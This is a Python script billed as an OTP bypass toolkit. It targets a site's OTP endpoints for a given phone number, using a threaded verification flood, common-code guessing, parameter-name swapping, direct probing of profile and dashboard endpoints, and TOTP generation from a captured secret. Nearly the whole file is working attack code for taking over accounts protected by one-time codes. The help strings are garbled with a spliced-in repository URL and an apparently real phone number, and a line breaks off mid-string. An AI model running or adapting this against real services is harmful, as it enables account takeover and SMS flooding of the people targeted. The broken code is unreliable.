
#!/usr/bin/env python3
"""
Complete OTP Bypass Toolkit v1.0
Authorized Penetration Testing Only
"""

import requests
import threading
import time
import hmac
import hashlib
import base64
import struct
import json
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
import argparse

class OTPBypassToolkit:
    def __init__(self, base_url, phone, proxies=None):
        self.base_url = base_url.rstrip('/')
        self.phone = phone
        self.session = requests.Session()
        self.session.proxies = proxies or {}
        self.otp_ref = None
        self.success = False
        
    def send_otp(self):
        """Send OTP request"""
        try:
            resp = self.session.post(
                urljoin(self.base_url, '/api/send-otp'),
                json={'phone': self.phone},
                timeout=10
            )
            if resp.status_code == 200:
                data = resp.json()
                self.otp_ref = data.get('otp_ref') or data.get('reference')
                print(f"✅ OTP sent. Ref: {self.otp_ref}")
                return True
        except Exception as e:
            print(f"❌ Send OTP failed: {e}")
        return False
    
    def test_race_condition(self, test_otp="123456"):
        """Race condition bypass"""
        print("\n🔥 Testing RACE CONDITION...")
        
        def spam_verify():
            while not self.success:
                if self.otp_ref:
                    resp = self.session.post(
                        urljoin(self.base_url, '/api/verify-otp'),
                        json={'otp_ref': self.otp_ref, 'otp': test_otp},
                        timeout=5
                    )
                    if resp.status_code == 200 and 'success' in resp.text.lower():
                        print(f"🎯 RACE CONDITION SUCCESS! OTP: {test_otp}")
                        self.success = True
                        return
        
        threads = []
        for i in range(30):
            t = threading.Thread(target=spam_verify)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(10)  # Give race time
        return self.success
    
    def brute_force_otp(self):
        """Brute force common OTPs"""
        print("\n💥 Testing BRUTE FORCE...")
        common_otps = [
            "123456", "000000", "111111", "123123",
            "000001", "123789", "654321"
        ]
        
        for otp in common_otps:
            resp = self.session.post(
                urljoin(self.base_url, '/api/verify-otp'),
                json={'otp_ref': self.otp_ref, 'otp': otp}
            )
            if resp.status_code == 200:
                print(f"🎯 BRUTE FORCE SUCCESS! OTP: {otp}")
                self.success = True
                return True
        return False
    
    def test_param_pollution(self):
        """Parameter pollution bypass"""
        print("\n🧪 Testing PARAMETER POLLUTION...")
        params = [
            {'otp': '123456'},
            {'code': '123456'},
            {'otp_code': '123456'},
            {'sms_code': '123456'},
            {'token': '123456'},
            {'verification_code': '123456'}
        ]
        
        for params_dict in params:
            resp = self.session.post(
                urljoin(self.base_url, '/api/verify-otp'),
                json=params_dict
            )
            if resp.status_code == 200:
                print(f"🎯 PARAM POLLUTION SUCCESS! {params_dict}")
                self.success = True
                return True
        return False
    
    def test_bypass_endpoints(self):
        """Test direct access bypass"""
        print("\n🚪 Testing BYPASS ENDPOINTS...")
        endpoints = [
            '/api/user/profile',
            '/api/dashboard', 
            '/api/account',
            '/profile',
            '/dashboard',
            '/user'
        ]
        
        for endpoint in endpoints:
            resp = self.session.get(urljoin(self.base_url, endpoint))
            if resp.status_code == 200:
                print(f"🎯 DIRECT ACCESS: {endpoint}")
                self.success = True
                return True
        return False
    
    def totp_attack(self, secret=None):
        """TOTP bypass if secret found"""
        if not secret:
            return False
            
        print("\n🔑 Testing TOTP BYPASS...")
        codes = self.generate_totp_codes(secret)
        
        for code in codes:
            resp = self.session.post(
                urljoin(self.base_url, '/api/verify-totp'),
                json={'totp': code}
            )
            if resp.status_code == 200:
                print(f"🎯 TOTP BYPASS: {code}")
                self.success = True
                return True
        return False
    
    def generate_totp_codes(self, secret, time_step=30, digits=6):
        """Generate valid TOTP window"""
        counter = int(time.time()) // time_step
        codes = []
        for offset in range(-2, 3):
            c = counter + offset
            msg = struct.pack(">Q", c)
            hmac_obj = hmac.new(base64.b32decode(secret.upper()), msg, hashlib.sha1)
            o = hmac_obj.digest()[19] & 15
            code = str((struct.unpack(">I", hmac_obj.digest()[o:o+4])[0] & 0x7fffffff) % (10**digits)).zfill(digits)
            codes.append(code)
        return codes
    
    def run_full_attack(self):
        """Complete attack chain"""
        print(f"🚀 Starting OTP Bypass on: {self.base_url}")
        print(f"📱 Target Phone: {self.phone}")
        print("-" * 60)
        
        # Step 1: Send OTP
        if not self.send_otp():
            print("❌ Failed to send OTP")
            return False
        
        # Step 2: Race condition
        if self.test_race_condition():
            return True
            
        # Step 3: Brute force
        if self.brute_force_otp():
            return True
            
        # Step 4: Param pollution
        if self.test_param_pollution():
            return True
            
        # Step 5: Direct bypass
        if self.test_bypass_endpoints():
            return True
            
        print("\n❌ No bypass found")
        return False

def main():
    parser = argparse.ArgumentParser(description="OTP Bypass Toolkit")
    parser.add_argument("url", help="Target base UR.https://github.com/abuhurayra12344321-coder/boss-boss.git")
    parser.add_argument("phone", help="Target phone number.+8801906828624")
    parser.add_argument("--secret", help="TOTP secret (if applicable.phone)")
    parser.add_argument("--proxy", help="Proxy (http://192.168.0.examp
    
    args = parser.parse_args()
    
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    
    attacker = OTPBypassToolkit(args.url, args.phone, proxies)
    
    # Run full attack
    success = attacker.run_full_attack()
    
    if success or attacker.success:
        print("\n🎉 BYPASS SUCCESSFUL!")
    else:
        print("\n💔 No bypass found. Try manual testing.")

if __name__ == "__main__":
    main()
